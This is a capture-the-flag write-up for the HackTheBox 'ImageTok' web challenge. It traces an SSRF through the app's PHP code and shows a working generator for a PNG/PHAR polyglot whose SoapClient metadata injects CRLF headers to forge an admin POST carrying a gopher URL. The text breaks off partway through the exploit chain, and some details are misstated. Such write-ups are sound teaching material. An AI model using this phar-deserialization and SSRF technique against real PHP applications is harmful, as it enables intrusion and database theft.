<h1 style="text-align:center;">ImageTok</h1>
*In a nearby planet, you sat down to eat some exotic fish but they turned out to be able to control the spacetime continuum, now your life is stuck as a gif picture where you have to relive the incident all over again till the end of times, unless you could escape this imagebin of nightmares of course.*
![image|center|280](../../img/Pasted%20image%2020230510140618.png)

## Digesting the code-base
### Check the Entrypoint.sh file
This file, which is responsible for the intitial start-up of the machine, contains importain information. Form this file it can be seen that the flag is in the database.
```mysql
INSERT INTO $DB_NAME.definitely_not_a_flag (flag) VALUES('HTB{f4k3_fl4g_f0r_t3st1ng}');
```

From this file it is clear that the database has no password and the username and database name, which are random values, are entered into the CGI as parameters.
```bash
echo -e "fastcgi_param DB_NAME $DB_NAME;\nfastcgi_param DB_USER $DB_USER;\nfastcgi_param DB_PASS '';" >> /etc/nginx/fastcgi_params
```

It is also clear that the `SECRET` used in the `index.php` file is replaced with a completely random value before execution, which I will explain more about later.
```bash
sed -i "s/\[REDACTED SECRET\]/$SECRET/g" /www/index.php
```

### Analyze how the server responds to requests
According to the `nginx.conf` file, it can be seen that all requests that are analyzed by the server are sent to the `index.php` file for response.
```php
location / {
            try_files $uri $uri/ /index.php?$query_string;
            location ~ \.php$ {
                try_files $uri =404;
                fastcgi_pass unix:/run/php-fpm.sock;
                fastcgi_index index.php;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
                include fastcgi_params;
            }
        }
```

The most important part of the `index.php` file is the definition of website paths, which is defined as follows. Each path with a specific method (POST or GET) is associated to a function within one of the `Controller` classes. Control classes are all defined in the `Controllers` folder. In one of these paths, the `param` input is also sent by the user to the corresponding control function, which is interesting.
```php
$router = new Router();
$router->new('GET', '/', 'ImageController@index');
$router->new('POST', '/upload', 'ImageController@store');
$router->new('GET', '/image/{param}', 'ImageController@show');
$router->new('POST', '/proxy', 'ProxyController@index');
$router->new('GET', '/info', function(){
    return phpinfo();
});
```

## Check Routes
In the first path (site root) there is an upload form and there is no more search space. But there are other important issues to consider:
- **`/info`** This page contains useful information about the `phpinfo` function, which will definitely be useful in solving the challenge.
- **`/upload`** is the path to which the upload form sends information. This section receives the uploaded file and saves it on the server side after passing the specified filters.
- **`/image/{param}/`** The uploaded file can be viewed from this path. (of course, a series of filters are applied at this stage).
- **`/proxy`** After several conditions such as admin being the username stored in the current session and `127.0.0.1` being the IP address of the client, it sends a request to the address specified in the `url` parameter using **CURL**

So far, we can imagine that we should be able to send a request by CURL by accessing the `/proxy` path and bypassing all available filters. But the question is, request to where?

Since this server is set up in Docker and does not open any ports other than a (web) port, we do not have direct access to the database and even though we know the username and passowrd, we cannot access the database. However, in this scenario, it is very likely that we can extract information from the web server by sending a request from the web server (inside the Docker Container) to the database. Since the attractive Gopher Wrapper is enabled for CURL, this scenario was our target.

## Check ProxyController
Give the `index` function in `ProxyController` class that handles the `/proxy` path, we must first bypass this condition:
```php
if ($session->read('username') != 'admin' || $_SERVER['REMOTE_ADDR'] != '127.0.0.1')
    {
        $router->abort(401);
    }
```
1. The username registered in the Session Cookie mus be equal to admin: For this, the user session management class defined in the `CustomSessionHandler.php` file must be checked.
2. The value of `$_SERVER['REMOTE_ADDR']` must be equal to `127.0.0.1`. There are two possibilities. First, a vulnerability in the web server settingss allows us to manipulate the `REMOTE_ADDR` value. Second, detecting a SSRF vulnerability from the side and use it if possible.

## CustomSessionHandler Review
There are two important funtions in this class that do the main job of signing the session cookie and verifying it.
The `Contructor` function of this class, if the user sends a cookie, starts checking its validity by `SECRET`. (The `SECRET` value was checked in the `entrypoint.sh` file, which is completely random and somewhat unpredictable)
```php
public function __construct()
    {
        if (isset($_COOKIE['PHPSESSID']))
        {
            $split = explode('.', $_COOKIE['PHPSESSID']);
            $data = base64_decode($split[0]);
            $signature = base64_decode($split[1]);
            if (password_verify(SECRET.$data, $signature))
            {
                $this->data = json_decode($data, true);
            }
        }
        self::$session = $this;
    }
```

The `save` function signs a session cookie and sends it to the user.
```php
public function save()
    {
        $json = $this->toJson();
        $jsonb64 = base64_encode($json);
        $signature = base64_encode(password_hash(SECRET.$json, PASSWORD_BCRYPT));
        setcookie('PHPSESSID', "${jsonb64}.${signature}", time()+60*60*24, '/');
    }
```

### Manipulate the value of REMOTE_ADDR
We did a lot of searching to find a vulnerability in the nginx web server for this. None of the items found matched the conditions of this challenge. As a result, we searched for SSRF vulnerabilities on the website.

### SSRF Vulnerability
The SSRF vulnerability can be used to change `REMOTE_ADDR` value to `127.0.0.1`. `/image` path is the part that can be most vulnerable. This path is responsible for displaying uploaded photos on the website. This is done by receiving a parameter in the URL as the name of the image file. The following control function is related to this path.
```php
public function show($router, $params)
    {
        $path = $params[0];
        $image = new ImageModel(new FileModel($path));
        if (!$image->file->exists())
        {
            $router->abort(404);
        }
        $router->view('show', ['image' => $image->getFile()]);
    }
```

In this function, an object of class `ImageModel` is created and if this fule exists, the function `getFile` is used to display it in the file format `views/show.php`. This function in the class `ImageModel` is defined as follows:
```php
public function getFile()
    {
        if (!$this->isValidImage())
        {
            return 'invalid_image';
        }
        return base64_encode($this->file->getContents());
    }
```

If the file is valid as a BASE64 image, the `getContents` function in `FileModel` class is returned
```php
public function getContents()
{
    return file_get_contents($this->file_name);
}
```

The `file_name` attribute is set in the `Constructor` of `FileModel` class and is the same parameter value that is received as a path from the user as the name of the image file. The interesting thing about this part is that this parameter `urldecode` has been changed.
```php
public function __construct($file_name)
{
    chdir($_ENV['UPLOAD_DIR'] ?? '/www/uploads');
    $this->file_name = urldecode($file_name);
    parent::__construct();
}
```

So our input is passed to `file_get_contents` dangerous function as `{param}` in the `/image/{param}` path section without any filtering after `urldecode`. Of course, there are a number of conditions that of they are not met, the execution of the program will not reach this function. So those conditions need to be considered.
1. `exits` function of  `FileModel` class: Existence of file.
2. `isValidImage` function in `ImageModel` class: PNG file format and dimesions over 120 by 120.

Here the user input is passed to another dangerous function called `file_exists` without filtering. This mean that all active Wrappers on the server side can be easily used. (Of course, the items specified in the CURL section of the page `phpinfo` are not applicable here)
```php
public function exists()
{
    return file_exists($this->file_name);
}
```

In this function, based on the content of the file, its format and dimensions are identified. This means that we can only extract the contents of the server-side PNG files, which makes the `file_get_contents` function less attractive.
```php
public function isValidImage()
{
    $file_name = $this->file->getFileName();
    if (mime_content_type($file_name) != 'image/png') 
        return false;
    $size = getimagesize($file_name);
    if (!$size || !($size[0] >= 120 && $size[1] >= 120) || $size[2] !== IMAGETYPE_PNG)
        return false;
    return true;
}
```

Among the available wrappers, phar is suitable for our work. Our team tried scenarios for some of the other options, but none of them worker. Part of `phpinfo` indicating `phar wrapper` is enabled. But why is phar suitable? What could be the related scenario?

## Attack with PHAR file format
The `PHP Archive (PHAR)` file format is used to publish PHP packages and is similar to JAR for Java
This file format has features that make it suitable for use in this challenge
1. **Suitable for Poluglot:** The first part of this file is called stub, which starts from the zero byte of the file. This section can have any value. So this can be changed from zerp bytes and can easily be inserted as another file format.
2. **Deserialization Vulnerability:** This file format has a section called Meta Data. This section stores a serialized PHP object. This object is automatically deserialized whenever the file is used by the corresponding Wrapper, `:pha://`
```php
class ImageModel
{
    public $file;
    public function __construct($file)
    {
        $this->file = new SoapClient(null, array(
            "location" => "http://localhost:80/proxy",
            "uri" => "http://localhost:80/proxy",
            "user_agent" => "clrf-inject\\r\\n\\r\\n\\r\\n\\r\\n".
                "POST /proxy HTTP/1.1\\r\\n".
                "Host: admin.imagetok.htb\\r\\n".
                "Connection: close\\r\\n".
                "Cookie: PHPSESSID=ADMIN_SESSION;\\r\\n".
                "Content-Type: application/x-www-form-urlencoded\\r\\n".
                "Content-Length: CONTENT_LENGTH\\r\\n\\r\\n".
                "url=GOPHER_URL".
                "\\r\\n\\r\\n\\r\\n"
        ));
    }
}
$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->addFile('IMAGE_FILE', 'IMAGE_FILE');
$phar->setStub(file_get_contents('IMAGE_FILE') . ' __HALT_COMPILER(); ?>');
$phar->setMetadata(new ImageModel('none'));
$phar->stopBuffering();
```

Running this code will create the `file.phar` file, which can be renamed to `file.png` and uploaded to the server instead of the PNG file. Of course, this is not a valid and viewable photo. But it bypasses all server side conditions. It is also a PHAR file that can be used for Deserialization on its Meta Data.

### Attack against Deserialization
To perform this attack we need to find a suitable **POP Chain (Property Oriented Programming)** in the server side program. Given that in PHP, the starting point in the POP Chain is one of the Magic Methods `__destruct` or `__awake`, we looked for these functions in the server-side code and found only one. The `__destruct` function in `ImageModel` class is the only starting point for an attack.
```php
public function __destruct()
{
    if (!empty($this->file)) {
        $file_name = $this->file->getFileName();
        if (is_null($file_name)) {
            $error = 'Something went wrong. Please try again later.';
            header('Location: /?error=' . urlencode($error));
            exit;
        }
    }
}
```

This function uses the `file` attribute. This attribute is an `FileModel` object in the nomal execution process. The `getFileName` function is called here. But this function does not do a dangerous job in `FileModel` class. As a result, we need to look for another object for the `file` attribute.

### __call Magic Method


[Writeup ImageTok Challenge in HackTheBox - Unk9vvN](https://unk9vvn.com/2021/03/writeup-imagetok-challenge-in-hackthebox/?lang=en)

